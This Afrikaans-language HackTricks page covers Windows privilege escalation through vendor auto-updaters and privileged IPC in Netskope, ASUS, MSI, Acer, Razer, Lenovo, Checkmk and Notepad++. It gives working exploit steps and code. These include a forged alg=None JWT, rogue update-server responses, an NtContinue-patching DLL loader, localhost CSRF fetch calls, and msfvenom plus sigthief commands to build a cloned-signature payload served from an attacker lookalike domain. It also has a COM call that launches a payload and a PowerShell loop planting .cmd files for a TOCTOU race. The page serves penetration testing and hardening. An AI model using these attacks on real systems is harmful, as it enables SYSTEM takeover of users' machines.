# Misbruik van Enterprise Auto-Updaters en Privileged IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen ’n klas Windows plaaslike privilege escalation-kettings wat gevind is in enterprise endpoint-agents en updaters wat ’n IPC-oppervlak met min hindernisse en ’n geprivilegieerde update-vloei blootstel. ’n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar ’n gebruiker met lae voorregte enrollment na ’n attacker-beheerde bediener kan afdwing en dan ’n kwaadwillige MSI kan lewer wat die SYSTEM-diens installeer.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Belangrike idees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik ’n geprivilegieerde diens se localhost IPC om her-enrollment of herkonfigurasie na ’n attacker-bediener af te dwing.
- Implementeer die vendor se update-endpoints, lewer ’n skelm Trusted Root CA, en wys die updater na ’n kwaadwillige, “signed” pakket.
- Omseil swak signer-kontroles (CN-allow-lists), opsionele digest-vlae en toegeeflike MSI-eienskappe.
- As IPC “encrypted” is, lei die key/IV af van masjien-identifiseerders wat vir almal leesbaar in die registry gestoor word.
- As die diens bellers volgens image path/process name beperk, inject in ’n proses op die allow-list of begin een suspended en bootstrap jou DLL via ’n minimale thread-context patch.

Pasgemaakte plaaslike TCP-dienste verdien dieselfde hersiening van identiteit en invoergrense, selfs wanneer hulle ’n PIN of ander application credential vereis. Koppel die listener aan sy proses en effektiewe diensrekening, en ondersoek dan die presiese ontplooide binary/version en of velde onder beheer van die beller se lengte nagegaan word voordat dit na vaste buffers gekopieer word of gebruik word om ’n child-process-opdrag saam te stel. [Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) verduidelik waarom eksterne invoer wat nie nagegaan word nie, gevaarlik is in geprivilegieerde native code. ’n Loopback-listener, hardcoded credential of prosesnaam op sigself bewys nie memory corruption of SYSTEM-uitvoering nie; bereikbaarheid, magtiging, code path en mitigations bly afsonderlike voorwaardes. Hou roetine-enumerasie passief eerder as om invoer met ’n crash-lengte na ’n lewendige diens te stuur.

---
## 1) Dwing enrollment na ’n attacker-bediener via localhost IPC

Baie agents sluit ’n user-mode UI-proses in wat via localhost TCP met ’n SYSTEM-diens kommunikeer deur JSON te gebruik.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-vloei:
1) Stel ’n JWT-enrollment-token saam waarvan die claims die backend-host beheer (bv. AddonUrl). Gebruik alg=None sodat ’n signature nie vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning-opdrag met jou JWT en tenant name aanroep:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Die diens begin jou rogue server vir enrollment/config raadpleeg, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As caller verification op path/name gebaseer is, laat die versoek ontstaan vanaf ’n allow-listed vendor binary (sien §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Kaping van die update channel om code as SYSTEM uit te voer

Sodra die client met jou server kommunikeer, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON config terug met ’n baie kort updater interval, bv.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gee ’n PEM CA certificate terug. Die diens installeer dit in die Local Machine Trusted Root-store.
3) /v2/checkupdate → Voorsien metadata wat na ’n kwaadwillige MSI en ’n vals weergawe wys.

Omseiling van algemene kontroles wat in die praktyk voorkom:
- Signer CN allow-list: die diens kontroleer dalk net of die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI onderteken.
- CERT_DIGEST-eienskap: sluit ’n onskadelike MSI-eienskap genaamd CERT_DIGEST in. Geen afdwinging tydens installasie nie.
- Opsionele digest-afdwinging: ’n config-vlag (bv. check_msi_digest=false) deaktiveer ekstra kriptografiese validering.

Gevolg: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre kode uit as NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Les uit die omseiling van ’n patch: as ’n vendor reageer deur ’n klein stel “trusted” domeine op ’n allow-list te plaas eerder as om die update-bron kriptografies te verifieer, soek na vendor-besitte redirectors of reverse proxies waarmee jy steeds verkeer kan stuur. In Netskope se geval het openbare opvolgnavorsing gewys dat ’n allow-list uit die R129-era steeds misbruik kon word via `rproxy.goskope.com`, wat inhoud vanaf ’n Azure App Service wat deur ’n aanvaller beheer is, geproxy het. Beskou hostname allow-lists as ’n spoedhobbel, nie as ’n trust boundary nie.<sup>[[14]](#references)</sup>

---
## 3) Vervalsing van encrypted IPC requests (waar dit voorkom)

Vanaf R127 het Netskope IPC JSON in ’n encryptData-veld verpak wat soos Base64 lyk. Reverse engineering het AES aan die lig gebring, met ’n key/IV wat afgelei word van registry-waardes wat deur enige gebruiker gelees kan word:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Aanvallers kan die encryption reproduseer en geldige encrypted commands vanaf ’n standaardgebruiker stuur.<sup>[[1]](#references)[[2]](#references)</sup> Algemene wenk: as ’n agent skielik sy IPC “encrypt”, soek na device IDs, product GUIDs en install IDs onder HKLM wat as materiaal gebruik word.

---
## 4) Omseiling van IPC caller allow-lists (path/name-kontroles)

Sommige dienste probeer die peer verifieer deur die PID van die TCP-verbinding te bepaal en die image path/name te vergelyk met vendor-binaries op die allow-list wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese omseilings:
- DLL injection in ’n proses op die allow-list (bv. nsdiag.exe) en proxy IPC van binne dit.
- Begin ’n binary op die allow-list in suspended toestand en laai jou proxy DLL sonder CreateRemoteThread (sien §5) om aan driver-afgedwonge tamper-reëls te voldoen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection-vriendelike injection: suspended process + NtContinue patch

Produkte sluit dikwels ’n minifilter/OB callbacks-driver (bv. Stadrv) in om gevaarlike regte te verwyder van handles na beskermde prosesse:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie beperkings respekteer:
1) Voer CreateProcess van ’n vendor-binary uit met CREATE_SUSPENDED.
2) Kry die handles wat steeds toegelaat word: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die proses, en ’n thread-handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy code by ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, gewaarborg-gemapte thunk) met ’n klein stub wat LoadLibraryW op jou DLL-pad aanroep en dan terugspring.
4) Voer ResumeThread uit om jou stub binne die proses te aktiveer en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds beskermde proses gebruik het nie (jy het dit self geskep), voldoen jy aan die driver se beleid.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktiese tooling
- NachoVPN (Netskope-inprop) outomatiseer ’n rogue CA, ondertekening van ’n kwaadwillige MSI en bediening van die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope is ’n pasgemaakte IPC-kliënt wat arbitrêre (opsioneel AES-encrypted) IPC-boodskappe saamstel en die suspended-process injection insluit om dit vanaf ’n binary op die allow-list te laat kom.<sup>[[4]](#references)</sup>

## 7) Vinnige triage-werkvloei vir onbekende updater/IPC-oppervlaktes

Wanneer jy ’n nuwe endpoint-agent of “helper”-suite vir ’n moederbord ondersoek, is ’n vinnige werkvloei gewoonlik genoeg om vas te stel of jy na ’n belowende privesc-teiken kyk:<sup>[[6]](#references)</sup>

1) Lys loopback-listeners op en karteer hulle na die vendor-prosesse:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Lys moontlike named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Ontgin registergesteunde roetedata wat deur plugin-gebaseerde IPC-bedieners gebruik word:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Haal eers eindpuntname, JSON-sleutels en opdrag-ID's uit die gebruikersmodus-kliënt. Gepakte Electron/.NET-voorkante laat dikwels die volledige schema lek:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Soek na die werklike trust-predikaat, nie net die kodepad wat uiteindelik die proses begin nie:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrone wat prioriteit verdien:
- `CryptQueryObject`/sertifikaatontleding sonder `WinVerifyTrust` beteken gewoonlik dat “sertifikaat bestaan” as “sertifikaat is vertroud” beskou is, wat sertifikaatkloning of ander vals-ondertekenaartruuks moontlik maak.
- Substring-/suffix-kontroles op `Origin`, `Referer`, aflaai-URL's, prosesname of ondertekenaar-CN's is nie verifikasie nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvallerbeheerde domeine wat soortgelyk lyk.
- As die GUI met lae voorregte besluit “die lêer is vertroud” en die SYSTEM-broker bloot daardie resultaat gebruik, omseil die patching of herimplementering van die kliëntkant-DLL/JS dikwels die grens heeltemal (Razer-styl gesplete validering).
- As die broker 'n loonvrag na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan vanaf daardie pad valideer of skeduleer, toets onmiddellik vir TOCTOU-vervangingsvensters en vir naburige plugin-modules wat alternatiewe `ExecuteTask()`-wrappers met swakker kontroles blootstel.<sup>[[6]](#references)</sup>

Vir teikens wat swaar op benoemde pype steun, is PipeViewer 'n vinnige manier om swak DACL's en pype wat op afstand bereikbaar is raak te sien voordat jy die protokol in diepte begin reverse-engineer.<sup>[[11]](#references)</sup>

As die teiken bellers net volgens PID, beeldpad of prosesnaam verifieer, beskou dit as 'n spoedhobbel eerder as 'n grens: om in die wettige kliënt in te spuit, of die verbinding vanuit 'n proses op die toelaatlys te maak, is dikwels genoeg om aan die bediener se kontroles te voldoen. Vir benoemde pype spesifiek, dek [hierdie bladsy oor kliënt-impersonasie en pypmisbruik](named-pipe-client-impersonation.md) die primitief in meer diepte.

Vir 'n bevoorregte **opruim- of herstelbroker**, ondersoek die padvertrouensgrens sowel as die pyp-ACL. 'n Gebruiker met laer voorregte kan dalk 'n herstelbestemming kies of 'n opgevoerde rugsteunartefak in 'n gedeelde gids hernoem, selfs wanneer die diensuitvoerbare lêer en sy installasiegids beskerm is. Bevestig afsonderlik dat die beller die herstelopdrag kan bereik, die presiese opgevoerde insetlêer of lêernaam kan wysig, die broker onder 'n hoër identiteit loop, en die herstelbewerking werklik na die gekose beskermde pad skryf. 'n Skryfbare opvoer-gids of 'n leesbare pyp alleen bewys nie arbitrêre bevoorregte skryftoegang nie; die bestemmingkartering en diensgedrag vereis kodehersiening of beheerde toetsing. Moenie 'n onbekende opruimopdrag tydens passiewe enumerasie uitvoer nie, want dit kan gebruikerslêers uitvee.

---
## 8) Modulêre byvoegselbrokers wat slegs deur verkoperhandtekeninge geverifieer word (Lenovo Vantage-patroon)

'n Nuwer variasie wat die moeite werd is om na te soek, is die **signed-client RPC broker**: 'n Lenovo-ondertekende rekenaarproses met lae voorregte kommunikeer met 'n SYSTEM-diens, en die diens stuur JSON-opdragte na 'n stel XML-beskrewe byvoegings onder `%ProgramData%`. Sodra kode-uitvoering **binne enige aanvaarde ondertekende kliënt** bereik is, word elke `runas="system"`-kontrak deel van jou aanvalsoppervlak.<sup>[[15]](#references)</sup>

Waardevolle primitiewe wat in Lenovo Vantage-navorsing waargeneem is:
- **Om die beller te vertrou omdat dit deur die verkoper onderteken is**: navorsers het 'n geverifieerde konteks bereik deur 'n Lenovo-ondertekende EXE na 'n skryfbare gids te kopieer en 'n DLL-side-load (`profapi.dll`) te bewerkstellig, sodat arbitrêre kode binne 'n kliënt wat die diens reeds vertrou, uitgevoer is.
- **Ontdekking van die manifesgedrewe aanvalsoppervlak**: byvoegings word onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` verklaar; verskeie kontrakte loop as `SYSTEM`, dus onthul enumerasie van daardie manifeste dikwels die werklike bevoorregte werkwoorde vinniger as om die broker self te reverse-engineer.
- **Foute per opdrag agter die geverifieerde kanaal**: sodra hulle binne die vertroude kliënt was, het openbare navorsing pad-traversering en rasetoestande in opdaterings-/installasiewerkwoorde, misbruik van rou SQL in bevoorregte instellingsdatabasisse en substringgebaseerde registerpadkontroles gevind wat skryfwerk buite die bedoelde hive moontlik gemaak het.

Nuttige verkenning op 'n teiken:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktiese gevolgtrekking: wanneer ’n helper-suite ’n broker blootstel wat eers die **caller process** verifieer en daarna dosyne plugin-/add-in-opdragte uitvoer, moet jy nie ophou nadat jy die voorste vertrouenskontrole omseil het nie. Dump die manifest-/contract-tabel en fuzz elke bevoorregte werkwoord afsonderlik; die geverifieerde kanaal verberg gewoonlik verskeie tweedevlak-foute.

---
## 1) Browser-na-localhost-CSRF teen bevoorregte HTTP-API's (ASUS DriverHub)

DriverHub verskeep ’n HTTP-diens in gebruikersmodus (ADU.exe) op 127.0.0.1:53000 wat verwag dat browser-oproepe vanaf https://driverhub.asus.com kom. Die oorspronkontrole voer bloot `string_contains(".asus.com")` uit op die Origin-header en op aflaai-URL's wat deur `/asus/v1.0/*` blootgestel word. Enige aanvaller-beheerde gasheer soos `https://driverhub.asus.com.attacker.tld` slaag dus die kontrole en kan toestandsveranderende versoeke vanaf JavaScript stuur.<sup>[[6]](#references)</sup> Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir bykomende omseilpatrone.

Praktiese verloop:
1) Registreer ’n domein wat `.asus.com` bevat en huisves ’n kwaadwillige webblad daarop.
2) Gebruik `fetch` of XHR om ’n bevoorregte eindpunt (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` aan te roep.
3) Stuur die JSON-liggaam wat die hanteerder verwag – die verpakte frontend-JS wys die skema hieronder.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Selfs die PowerShell CLI hieronder slaag wanneer die Origin-header vervals word om die vertroude waarde te wees:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Enige besoek met ’n blaaier aan die aanvaller se site word dus ’n plaaslike CSRF met 1 klik (of 0 klikke via `onload`) wat ’n SYSTEM-helper aanstuur.

---
## 2) Onveilige code-signing-verifikasie en sertifikaatkloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrêre uitvoerbare lêers af wat in die JSON-liggaam gedefinieer word en kas dit in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. URL-validering vir aflaaie hergebruik dieselfde substring-logika, dus word `http://updates.asus.com.attacker.tld:8000/payload.exe` aanvaar. Ná die aflaai kontroleer ADU.exe bloot dat die PE ’n handtekening bevat en dat die Subject-string met ASUS ooreenstem voordat dit die lêer laat loop – geen `WinVerifyTrust` of kettingvalidering nie.

Om die vloei te bewapen:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Kloon ASUS se ondertekenaar na die payload (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Gasheer `pwn.exe` op ’n `.asus.com`-nabootsingsdomein en aktiveer UpdateApp via die blaaier-CSRF hierbo.

Omdat beide die Origin- en URL-filters op substrings gebaseer is en die ondertekenaarkontrole slegs strings vergelyk, laai DriverHub die aanvaller se binêre lêer af en voer dit in sy verhoogde konteks uit.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU binne opdateringsprogram se kopieer-/uitvoer-paaie (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM-diens stel ’n TCP-protokol beskikbaar waar elke raam `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die kernkomponent (Component ID `0f 27 00 00`) bevat `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy hanteerder:
1) Kopieer die gegewe uitvoerbare lêer na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifieer die handtekening via `CS_CommonAPI.EX_CA::Verify` (die sertifikaat se subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` moet slaag).
3) Skep ’n geskeduleerde taak wat die tydelike lêer as SYSTEM uitvoer met argumente wat deur die aanvaller beheer word.

Die gekopieerde lêer word nie tussen verifikasie en `ExecuteTask()` gesluit nie. ’n Aanvaller kan:
- Raam A stuur wat na ’n wettige MSI-ondertekende binêre lêer wys (waarborg dat die handtekeningkontrole slaag en die taak in die ry geplaas word).
- Dit met herhaalde Raam B-boodskappe jaag wat na ’n kwaadwillige payload wys en `MSI Center SDK.exe` oorskryf net ná die verifikasie voltooi is.

Wanneer die skeduleerder die taak uitvoer, voer dit die oorskryfde payload as SYSTEM uit, hoewel die oorspronklike lêer gevalideer is. Betroubare uitbuiting gebruik twee goroutines/drade wat `CMD_AutoUpdateSDK` oor en oor stuur totdat die TOCTOU-venster gewen word.<sup>[[6]](#references)</sup>

---
## 2) Misbruik van pasgemaakte SYSTEM-vlak IPC en nabootsing (MSI Center + Acer Control Centre)

### MSI Center TCP-opdragstelle
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 grepe van ’n raam kies daardie komponent, sodat aanvallers opdragte na arbitrêre modules kan stuur.
- Plugins kan hul eie taakuitvoerders definieer. `Support\API_Support.dll` stel `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` beskikbaar en roep `API_Support.EX_Task::ExecuteTask()` direk aan, **sonder handtekeningvalidering** – enige plaaslike gebruiker kan dit na `C:\Users\<user>\Desktop\payload.exe` laat wys en deterministies SYSTEM-uitvoering verkry.
- Deur loopback met Wireshark af te luister of die .NET-binêre lêers in dnSpy te instrumenteer, kan die Component ↔ command-kartering vinnig onthul word; pasgemaakte Go-/Python-kliënte kan dan rame herhaal.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes en nabootsingsvlakke
- `ACCSvc.exe` (SYSTEM) stel `\\.\pipe\treadstone_service_LightMode` beskikbaar, en die diskresionêre ACL laat afgeleë kliënte toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). As opdrag-ID `7` met ’n lêerpad gestuur word, roep dit die diens se prosesbeginroetine aan.
- Die kliëntbiblioteek serialiseer ’n magiese terminator-greep (113) saam met die args. Dinamiese instrumentering met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumenteringswenke) wys dat die native hanteerder hierdie waarde na ’n `SECURITY_IMPERSONATION_LEVEL` en integriteit-SID karteer voordat dit `CreateProcessAsUser` aanroep.
- Deur 113 (`0x71`) met 114 (`0x72`) te vervang, beland dit in die generiese tak wat die volledige SYSTEM-token behou en ’n hoë-integriteit-SID (`S-1-16-12288`) stel. Die voortgebringde binêre lêer loop dus as onbeperkte SYSTEM, plaaslik sowel as oor verskeie masjiene.
- Kombineer dit met die blootgestelde installeerdervlag (`Setup.exe -nocheck`) om ACC selfs op laboratorium-VM’s op te stel en die pipe sonder verskafferhardeware te toets.<sup>[[6]](#references)</sup>

Hierdie IPC-foute beklemtoon waarom localhost-dienste wedersydse verifikasie moet afdwing (ALPC SIDs, `ImpersonationLevel=Impersonation`-filters, token filtering) en waarom elke module se “voer arbitrêre binêre lêer uit”-helper dieselfde ondertekenaarverifikasies moet gebruik.

---
## 3) COM/IPC-“elevator”-helpers met swak gebruikersmodus-validering (Razer Synapse 4)

Razer Synapse 4 het nog ’n nuttige patroon by hierdie familie gevoeg: ’n gebruiker met lae voorregte kan ’n COM-helper versoek om ’n proses via `RzUtility.Elevator` te begin, terwyl die vertrouensbesluit aan ’n gebruikersmodus-DLL (`simple_service.dll`) gedelegeer word, eerder as om dit robuust binne die bevoorregte grens af te dwing.

Waargenome uitbuitingspad:
- Instansieer die COM-objek `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om ’n verhoogde prosesbegin te versoek.
- In die openbare PoC word die PE-handtekeninghek binne `simple_service.dll` uitgepatch voordat die versoek gestuur word, sodat ’n arbitrêre uitvoerbare lêer wat deur die aanvaller gekies is, geloods kan word.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-aanroep:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Algemene gevolgtrekking: wanneer jy “helper”-suites reverse-engineer, moenie by localhost TCP of named pipes ophou nie. Kyk vir COM-klasse met name soos `Elevator`, `Launcher`, `Updater` of `Utility`, en verifieer dan of die bevoorregte diens self die teikenbinary valideer, of bloot ’n resultaat vertrou wat deur ’n wysigbare user-mode client DLL bereken is. Hierdie patroon strek verder as Razer: enige gesplete ontwerp waar die hoëbevoorregte broker ’n allow/deny-besluit van die laelbevoorregte kant gebruik, is ’n moontlike privesc-aanvalsoppervlak.


---
## Voorspelbare uitvoering van tydelike skripte tydens MSI-herstel (Checkmk Agent / CVE-2024-0670)

Sommige Windows-agente implementeer steeds bevoorregte aksies deur ’n tydelike `.cmd`-lêer in `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die lêernaam voorspelbaar is en die diens nie bestaande lêers veilig herskep nie, kan ’n gebruiker met lae voorregte die toekomstige tydelike lêer vooraf as **read-only** skep en die bevoorregte proses dwing om inhoud onder die aanvaller se beheer uit te voer in plaas van sy eie skrip.

Waargeneem in kwesbare Checkmk Agent-bouweergawes:
- tydelike patroon: `cmk_all_<PID>_1.cmd`
- geraakte takke: `2.0.0`, `2.1.0`, `2.2.0`
- sneller: MSI-**herstel** van die agentpakket in die kas<sup>[[8]](#references)[[9]](#references)</sup>

Praktiese werksvloei:
1. Skat ’n realistiese PID-reeks op grond van huidige proses-ID’s of die lopende agent-PID.
2. Skryf ’n kort **ASCII**-`.cmd`-lading (`Set-Content -Encoding Ascii` of `cmd.exe`-herleiding; vermy UTF-16 PowerShell-uitvoer vir bondellêers).
3. Spuit `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die kandidaat-reeks uit en merk elke lêer as read-only.
4. Sneller ’n herstel van die MSI in die kas sodat die bevoorregte diens probeer om die tydelike skrip te herskep en dit dan uit te voer.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

As die kwesbare produk met Windows Installer geïnstalleer is, karteer die ewekansig lykende MSI-lêer in die kas onder `C:\Windows\Installer` terug na sy produknaam voordat jy die herstel aktiveer:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operasionele notas:
- `qwinsta` is nuttig wanneer `msiexec /fa` vanuit ’n nie-interaktiewe WinRM-shell misluk en jy moet vasstel of ’n bestaande rekenaarsessie/ontkoppelde sessie die herstelproses korrek kan aktiveer.<sup>[[7]](#references)</sup>
- Hierdie patroon geld ook vir ander endpoint-agente en updaters wat **tydelike scripts in wêreldskryfbare liggings plaas en dit later as SYSTEM uitvoer**. Toets vir voorspelbare name, ontbrekende eksklusiewe-skeppingssemantiek en herstel-/opdateringsvloeie wat op aanvraag geaktiveer kan word.

### Interaktiewe installerherstel en bevoorregte konsole

PDF24 Creator 11.15.1 toon ’n afsonderlike MSI-herstelrisiko: die pasgemaakte aksie vir drukkerinstallasie kan tydens herstel ’n sigbare konsole met SYSTEM-regte begin. Die verskaffer het die MSI-installeerder in 11.15.2 verander om hierdie gedrag aan te spreek. ’n Ouer produkweergawe is slegs ’n leidraad vir triage. Gaan die geregistreerde of bereikbare MSI-pakket na, of hierdie gebruiker herstel kan begin, of die kwesbare pasgemaakte aksie en vertraging in die loglêer teenwoordig is, en of ’n interaktiewe rekenaaromgewing die konsole kan blootstel. Die gerapporteerde vertraging het ’n oplock op `faxPrnInst.log` gebruik; gewone lêerskryfbaarheid is nie die enigste toegangstoestand nie. ’n Nie-interaktiewe shell, ontoeganklike pakket of gelapte installeerder kan die ketting verbreek. Hierdie probleem is nie afhanklik van `AlwaysInstallElevated` nie en verskil van die vervanging van ’n voorspelbare tydelike script.

---
## Afgeleë voorsieningskettingkaping via swak updater-validering (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het aanvallers wat die gasheerinfrastruktuur agter die Notepad++-opdateringsvloei gekompromitteer het, selektief kwaadwillige manifeste aan uitgesoekte slagoffers bedien. Ouer WinGUp-gebaseerde updaters het nie die egtheid van opdaterings volledig geverifieer nie, dus kon ’n kwaadwillige XML-antwoord kliënte na aanvallerbeheerde URL’s herlei. Omdat die kliënt HTTPS-inhoud aanvaar het sonder om beide ’n vertroude sertifikaatketting en ’n geldige PE-handtekening op die afgelaaide installeerder af te dwing, het slagoffers ’n getrojaniseerde NSIS-`update.exe` afgelaai en uitgevoer.<sup>[[12]](#references)[[13]](#references)</sup>

Operasionele vloei (geen plaaslike exploit nodig nie):
1. **Infrastruktuuronderskepping**: kompromitteer die CDN/gasheerdiens en antwoord op opdateringskontroles met aanvaller-metadata wat na ’n kwaadwillige aflaai-URL wys.
2. **Getrojaniseerde NSIS**: die installeerder haal ’n payload af/voer dit uit en misbruik twee uitvoeringskettings:
   - **Bring-your-own signed binary + sideload**: bondel die Bitdefender-`BluetoothService.exe` met ’n geldige handtekening en plaas ’n kwaadwillige `log.dll` in sy soekpad. Wanneer die binêre lêer met ’n geldige handtekening loop, laai Windows `log.dll` via sideloading; dié lêer dekripteer en laai die Chrysalis-backdoor reflektief (Warbird-beskerm + API-hashing om statiese opsporing te bemoeilik).
   - **Skripgebaseerde shellcode-inspuiting**: NSIS voer ’n saamgestelde Lua-script uit wat Win32-API’s (bv. `EnumWindowStationsW`) gebruik om shellcode in te spuit en Cobalt Strike Beacon te ontplooi.<sup>[[12]](#references)</sup>

Verhardings-/opsporingslesse vir enige updater:
- Dwing **sertifikaat- én handtekeningverifikasie** van die afgelaaide installeerder af (pen die verskaffer se ondertekenaar vas, verwerp ’n CN/ketting wat nie ooreenstem nie) en onderteken die opdateringsmanifest self (bv. XMLDSig). Blokkeer herleidings wat deur manifeste beheer word, tensy dit gevalideer is.
- Behandel **BYO-sideloading van binêre lêers met ’n geldige handtekening** as ’n opsporingspunt ná aflaai: waarsku wanneer ’n EXE met ’n geldige verskafferhandtekening ’n DLL met ’n naam buite sy kanonieke installasiepad laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai), en wanneer ’n updater installeerders vanaf ’n tydelike gids plaas/uitvoer met handtekeninge wat nie van die verskaffer is nie.
- Monitor **malware-spesifieke artefakte** wat in hierdie ketting waargeneem is (nuttig as algemene soekpunte): mutex `Global\Jdhfv_1.0.1`, abnormale `gup.exe`-skryfbewerkings na `%TEMP%` en Lua-gedrewe shellcode-inspuitingsfases.
